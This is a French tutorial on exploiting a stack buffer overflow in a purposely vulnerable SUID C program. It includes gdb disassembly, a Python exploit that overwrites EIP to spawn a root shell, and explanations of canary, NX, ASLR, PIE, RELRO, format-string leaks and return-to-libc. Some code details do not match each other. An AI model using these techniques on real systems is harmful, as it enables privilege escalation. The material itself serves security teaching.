# Préparation

Le code vulnérable se trouve dans le fichier main.c
Le but est d'atteindre la fonction dangerZONE(), qui executera un shell.
Il s'agit d'un suid, avec les privilèges root...

## Compilation

```sh
gcc -fno-stack-protector -o overflow -m32  main.c
```

-fno-stack-protector will disable the canary technique.
-m32 will compile in 32bits

## Désactiver ASLR - Address space layout randomization

```sh
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
```
L’address space layout randomization (ASLR) (« distribution aléatoire de l'espace d'adressage ») est une technique permettant de placer de façon aléatoire les zones de données dans la mémoire virtuelle. Il s’agit en général de la position du tas, de la pile et des bibliothèques. 

## Rendre le programme SUID

```sh
sudo chown root.root overflow
sudo chmod +s overflow 
```


# Exploit

Dans la fonction vuln(...) se trouve la variable buffer[20], et on peut voir par la suite que la fonctionne copie le contenue de char \*string dans le buffer. Ce code est vulnérable à un buffer overflow.

```c
void vuln(char* string){
    
    char buffer[20];
    strcpy(buffer, string);
}
```

la fonction vuln() est appelée dans le main :

```c
int main(int argc, char *argv[]){

    printf("Hello \n");
    
    if(argc > 1){
        
        vuln(argv[1]);
       
    }else{
        printf("Enter data...\n");
    }
    
    return 0;
}
```
vuln prend en paramètre argv[1] (qui est un tableau de pointeur contenant les arguments passés en entré standard du programme)
ici on récupère le second argument passer en paramètre, le premier à l'indice 0 contient le chemin du programme.

La cible qui nous interesse est la fonction dangerZONE() :
```c
void dangerZONE(){
    
    printf("sucess\n");

    char *name[] = {"/bin/bash", NULL};
    setuid(0);
    execvp(name[0], name);

}
```
Cette fonction n'est appelée nul part dans le programme, donc inaccessible. Elle fait apparaitre un shell.
L'idée est donc de réussir à changer le cours d'execution du programme et de faire apparaitre un shell.



## Analyse avec gdb

### Récupérer l'adresse de dangerZONE()

La sécurité PIE est activée, au lieu que le programme soit placée de manière statique dans l'espace d'adressage, grâce à pie il aura une position indépendante lors de son exécution, cette sécurité est le support de l'ASLR. ASLR quant à elle est utilisée pour rendre aléatoire l'adressage du programme en mémoire (elle est désactivé pour ce test ci).

Pour récupérer l'adresse, je vais utiliser  gdb et exécuter le programme avec la commande start (l'adressage est défini quand le programme est démarrer - il sera toutefois toujours le même, car l'ASLR est désactivé). Une fois ça je fais désassembler dangerZONE() :

```sh
(gdb) disas dangerZONE
```
Ce qui donne :
```asm
Dump of assembler code for function dangerZONE:
   0x5655620d <+0>:     endbr32 
   0x56556211 <+4>:     push   %ebp
   0x56556212 <+5>:     mov    %esp,%ebp
   0x56556214 <+7>:     push   %ebx
   0x56556215 <+8>:     sub    $0x4,%esp
   0x56556218 <+11>:    call   0x56556110 <__x86.get_pc_thunk.bx>
   0x5655621d <+16>:    add    $0x2db3,%ebx
   0x56556223 <+22>:    sub    $0xc,%esp
   0x56556226 <+25>:    lea    -0x1fc8(%ebx),%eax
   0x5655622c <+31>:    push   %eax
   0x5655622d <+32>:    call   0x565560a0 <puts@plt>
   0x56556232 <+37>:    add    $0x10,%esp
   0x56556235 <+40>:    sub    $0xc,%esp
   0x56556238 <+43>:    lea    -0x1fc1(%ebx),%eax
   0x5655623e <+49>:    push   %eax
   0x5655623f <+50>:    call   0x565560b0 <system@plt>
   0x56556244 <+55>:    add    $0x10,%esp
   0x56556247 <+58>:    nop
   0x56556248 <+59>:    mov    -0x4(%ebp),%ebx
   0x5655624b <+62>:    leave  
   0x5655624c <+63>:    ret   
```

l'adresse de la fonction : "0x5655620d"

Je sais que les adresses sont représenté en little-endian, c'est à dire le bit de poids faible vers bit de poids fort, il faut donc inverser l'adresse quand on l'injectera dans le payload :

**addr = "\x0d\x62\x55\x56"**


### Analyse du code de vuln()

Une notion importante est que lorsqu'on créer une variable le compilateur n'alloue pas nécessairement un espace égal à la taille de la variable dans la pile, il prends souvent une marge, exemple :

```sh
(gdb) disas vuln
```
```asm
Dump of assembler code for function vuln:
   0x5655624d <+0>:     endbr32 
   0x56556251 <+4>:     push   %ebp
   0x56556252 <+5>:     mov    %esp,%ebp
   0x56556254 <+7>:     push   %ebx
 ->  0x56556255 <+8>:     sub    $0x24,%esp
   0x56556258 <+11>:    call   0x56556312 <__x86.get_pc_thunk.ax>
   0x5655625d <+16>:    add    $0x2d73,%eax
   0x56556262 <+21>:    movl   $0x0,-0x1c(%ebp)
   0x56556269 <+28>:    movl   $0x0,-0x18(%ebp)
   0x56556270 <+35>:    movl   $0x0,-0x14(%ebp)
   0x56556277 <+42>:    movl   $0x0,-0x10(%ebp)
   0x5655627e <+49>:    movl   $0x0,-0xc(%ebp)
   0x56556285 <+56>:    sub    $0x8,%esp
   0x56556288 <+59>:    pushl  0x8(%ebp)
   0x5655628b <+62>:    lea    -0x1c(%ebp),%edx
   0x5655628e <+65>:    push   %edx
   0x5655628f <+66>:    mov    %eax,%ebx
   0x56556291 <+68>:    call   0x56556090 <strcpy@plt>
   0x56556296 <+73>:    add    $0x10,%esp
   0x56556299 <+76>:    nop
   0x5655629a <+77>:    mov    -0x4(%ebp),%ebx
   0x5655629d <+80>:    leave  
 ```
 là où il y a la flèche est représenté l'endroit ou le code alloue l'espace de données qui contiendra entre autre notre variable buffer[20].
le code qui alloue cet espace est celui-ci :

```asm
0x56556255 <+8>:     sub    $0x24,%esp
```
On sait aussi que le pointeur ebx à était empilé sur la pile

Pour expliquer ce que cela fait il faut aborder la notion de la pile est de comment elle fonctionne.

 ```
 Adresses Basse
        /\
        |                +------------+ <-- ESP
        |                | Vars Space |
        |                +------------+ <-- EBP
        |                |     EBX    |
        |                +------------+
Croit vers le bas       | Saved EBP  |
        |                +------------+
        |                | Saved EIP  |
        |                +------------+
        |                
        |                
 Adresses Haute         
        |                
        |                
        |                
        |                
        |                
        
 ```
Le registre ESP, contient un pointer qui représente le haut de la pile, quand on sub, (soustraire) une valeur à ce pointeur, on peu observer sur ce schéma que cela va augmenter la pile vers les adresses basse, du coup faire croitre la taille de la pile. Il faut donc prendre ça en compte pour construire notre payload.

Nous savons que EBX, EBP et EIP (notre cible) sont des registres contenant les adresses de pointeurs  ebx (qui n'est pas spécialisé - peut être utilisé comme stockage... ) EBP qui est le pointeur de bas de pile, c'est par rapport à celui-ci qu'on se déplace dans la pile EBP+1, EBP+2... et enfin EIP qui est le pointeur de fin de pile il contient l'adresse de la prochaine instruction, ici il contiendra l'instruction du else dans la fonction main... C'est ce pointeur que l'on cherchera à ré écrire, on le fera pointer à l'adresse de la fonction dangerZONE().

Quand on overflow le buffer on va écrire nos caractère de Vars espace vers les adresses basse de la pile c'est à dire que nous allons écrire par dessus EBX, EBP et enfin EIP.


## Création du payload
Chacun de ces registre contiennent une données codée sur 4 octets pour connaitre la taille de notre fuzzer il suffit de faire :

(0x24) - sizeof(ebx) - sizeof(ebp) - sizeof(eip) = 36 - 4 - 4 - 4 = 24.

Ce qui donne comme payload :

fuzzer = "A" * 24
ebx = "B" * 4
ebp = "C" * 4
eip = "\x0d\x62\x55\x56"

payload = fuzzer + ebx + ebp + eip


### Exploit.py
Nous allons faire un code en python qui exploit le programme :

```python
import sys, subprocess


fuzzer = b"\x41"*24
ebx = b"\x42"*4
ebp = b"\x43"*4

addr = b"\x0d\x62\x55\x56"
payload = fuzzer  + ebx  + ebp + addr

args = ["./overflow",  payload]

subprocess.call(args)
```
On retrouve bien notre préparation du payload vue dans la partie précédente.
Pour appeler le programme nous allons utilisé call de la librairie subprocess, et on passe à la fonction un tableau contenant les arguments d'appel : le programme et le payload. puis on execute :

```sh
mandel@ubuntu:~/Desktop/overflow/nocanary$ make exploit 
python3 exploit.py
Hello 
sucess
> id
uid=0(root) gid=0(root) groupes=0(root)
> 
```
On peut voir que le buffer overflow à bien fonctionner nous somme root sur la machine, on peut donc accéder au fichier password
```sh
python3 exploit.py
Hello 
sucess
> cd ..
> ls
canary  nocanary  passwd
> cat passwd
THIS_IS_THE_FLAG:241qsd4q54
>
```


## Les sécurités contre le buffer overflow

## Le Canary

Comme on la vue on quand on overflow le programme on écrit vers les adresses basse de la pile, donc en direction des pointeur EBP et EIP, l'idée inventée par Hiroaki Etoh chercheur à IBM consiste à ajouté une valeur entre l'espace buffer et les pointeurs :

![canary](https://i.imgur.com/VIsVy6Y.png)

Comme on peut le voir quand on overflow le buffer avec "A" = 0x41 On va réécrire inévitablement le canary et le programme crash :
![canary2](https://i.imgur.com/SpowdXm.png)

Expérimentons en recompilant le programme en activant la protection du canary :
(donc sans l'argument : -fno-stack-protector)
```
gcc -m32 -o overflow main.c
```

Résultat de l'execution avec le même exploit :

```sh
python3 exploit.py
Hello 
*** stack smashing detected ***: terminated
```
Comme on peut le voir le système à détecté que nous avons écrit par dessus le canary.



## Non executable stack - NX
Le NX Bit, pour No eXecute, est une technique utilisée dans les processeurs pour dissocier les zones de mémoire contenant des instructions, donc exécutables, des zones contenant des données. Ceci permet de faire de la protection d'espace exécutable.

Dans notre cas nous modifions le pointeur eip vers l'adresse de dangerZONE(), du coup cette protection est inefficace. Dans un autre si dangerZONE() n'existait pas on aurait pu utilisé l'attaque returntolibc = return to libc qui consiste à réécrire eip avec l'adresse d'une fonction de la librairie standard par exemple la fonction execv (qui permet d'executer un programme tiers).

## Fortify_source

L'idée de la sécurité Fortify_source, est de tenté de détecter certaine classes de buffer overflow, lorsque la sécurité est activée le compilateur va remplacer les fonction "non sûr" par leur variante "sûr" :

Fonctions non sûr :
- mempcpy 
- memmove 
- memset 
- stpcpy
- strncpy 
- strcat 
- strncat
- sprintf 
- snprintf, 
- vsprintf
- gets



## PIE
Ce n'est pas vraiment une sécurité mais un pré-requis à l'adressage aléatoire du programme en mémoire (ASLR).
Quand cette option est activé, l'adressage du programme sera bien "fini" mais sa position absolu dans la mémoire sera différente. 
Un code indépendant de la position peut être exécuté à n'importe quelle adresse mémoire sans modification. Code indépendant de la position.

Dans notre cas cela ne change pas l'attaque, il suffit d'exécuter le programme dans le debugger GDB pour récupérer son adresse.

## ASLR
L'address space layout randomization (ASLR) (« distribution aléatoire de l'espace d'adressage ») est une technique permettant de placer de façon aléatoire les zones de données dans la mémoire virtuelle. Il s’agit en général de la position du tas, de la pile et des bibliothèques. Ce procédé permet de limiter les effets des attaques de type dépassement de tampon.

Dans notre cas nous l'adresse de dangerZONE() sera différente à chaque appel du programme, donc notre exploit ne fonctionne plus, exemple de l'adresse de dangerZONE :
- 1er  : 0x 56 61 32 0d
- 2eme : 0x 56 64 f2 0d
- 3eme : 0x 56 5b c2 0d
- 4eme : 0x 56 61 82 0d

On observe cependant que seulement 2 octets, enfaite quand le programme est compilé en 32bit, l'ASLR est limité :
![](https://i.imgur.com/iPaCQjX.png)

Comme le montre le schéma, une adresse est une valeur contenant plusieurs indicateur :
- Page directory : 1024*32 bit qui contient des pages
- Page entry ou page : qui est un chunk de mémoire
- L'offset : qui permet de choisir une valeur dans la page (page+offset)

L'ASLR ne peut pas rendre aléatoire les Répertoires de page sinon ça crasherai le système... Mais seulement Les page utilisées dans un répertoire, l'offset quant à lui reste le même puisqu'il indique la position relative à la page (qui a été choisi aléatoirement par l'ASLR).

exemple avec nos adresses :

```
    +---------------+-----------------+-------------+----------+
    | hex indicator | Page Directory  | Page Entry  |   OffSet |
    +---------------+-----------------+-------------+----------+
    |   0x          |       56        |   Random    |   0d     |
    +---------------+-----------------+-------------+----------+

```

## RELocation Read-Only - RELRO


Le Global Offset Table, ou GOT, est une section de la mémoire d'un programme informatique (exécutables et bibliothèques partagées) utilisée pour permettre au code de programme s'exécuter correctement, indépendamment de l'adresse mémoire où le code ou les données du programme sont chargés au moment de l'exécution.

Il fait correspondre les symboles du code à leurs adresses mémoire absolues correspondantes pour faciliter le :
- code indépendant de la position (PIC) 
- exécutables indépendants de la position (PIE).

Le GOT est alimenté de manière dynamique pendant le déroulement du programme. La première fois qu'une fonction partagée est appelée, le GOT contient un pointeur vers le PLT, où le linker dynamique est appelé pour trouver l'emplacement réel de la fonction en question. L'emplacement trouvé est ensuite écrit dans le GOT. La deuxième fois qu'une fonction est appelée, le GOT contient l'emplacement connu de la fonction. C'est ce que l'on appelle la "lazy link". En effet, il est peu probable que l'emplacement de la fonction partagée ait changé et cela permet également d'économiser quelques cycles de CPU.

Il y a quelques implications. Premièrement, le PLT doit être situé à un décalage fixe par rapport à la section .text. Deuxièmement, comme GOT contient des données utilisées directement par différentes parties du programme, il doit être attribué à une adresse statique connue en mémoire. Enfin, et surtout, comme GOT est paresseusement lié, il doit être accessible en écriture.

Puisque GOT existe à un endroit prédéfini de la mémoire, un programme qui contient une vulnérabilité permettant à un attaquant d'écrire 4 octets à un endroit contrôlé de la mémoire (comme certains débordements d'entiers conduisant à des écritures hors limites), peut être exploité pour permettre l'exécution de code arbitraire.

Pour évité ça la sécurité RELRO permet de demander au linker de résoudre les fonctions de bibliothèques dynamiques au tout début de l’exécution, et donc de pouvoir remapper la section GOT et GOT.plt en lecture seule. 


## Contre mesure des sécurités
### String Format - Contourne ASLR
L'exploitation de la chaîne de format se produit lorsque les données soumises d'une chaîne d'entrée sont évaluées comme une commande par l'application.

Exemple :

```c
#include <stdio.h>
#include <stdlib.h>
 
int main(int argc, char *argv[]) {
 
 if(argc<1) {
    printf( argv[1] );
    printf("\n");
 }
}
```
ici l'argument 1 est directement passé en paramètre de printf. Voyons voir ce qu'il se passe si nous passons en paramètre des caractère formatés comme %x (hex) :

```
./overflow %x-%x-%x-%x-%x
Hello 
ffe101ad-6-565f327d-0-f7efc000 <------- ?????!!!!!!!!!!!!!!!!!
```
Nous venons de lire le contenu de la pile du programme !!!, ce qui veut dire que malgré l'ensemble des sécurités mise en place notamment l'ASLR est bien nous pouvons voir où se trouve chaque symboles en mémoire (fonctions, variables, etc...).

### Return to libc - Contourne NX

Une attaque de type return-to-libc est une attaque informatique démarrant généralement par un dépassement de tampon dans lequel l'adresse de retour dans la pile est remplacée par l'adresse d'une autre fonction et une seconde partie de la pile est modifiée pour fournir les paramètres à cette fonction. Ceci permet à un attaquant d'utiliser une fonction existante et d'éviter d'injecter du code malveillant dans le programme. 
Dans ce cas de figure on contourne le fait de pouvoir exécuter un shellcode.
